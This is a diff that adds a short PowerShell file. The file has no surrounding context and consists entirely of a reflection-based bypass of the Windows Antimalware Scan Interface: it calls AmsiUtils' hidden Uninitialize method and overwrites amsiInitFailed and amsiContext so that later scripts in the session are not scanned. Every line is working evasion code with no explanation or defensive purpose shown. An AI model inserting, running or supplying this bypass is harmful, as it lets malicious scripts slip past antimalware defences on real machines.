@@ -1,0 +1,5 @@
+$asm = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
+$met = $asm.GetMethods("NonPublic,Static") | Where-Object { $_.Name -eq "Uninitialize" }
+$met.Invoke($asm, $null)
+$asm.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
+$asm.GetField("amsiContext","NonPublic,Static").SetValue($null,[IntPtr]::Zero)
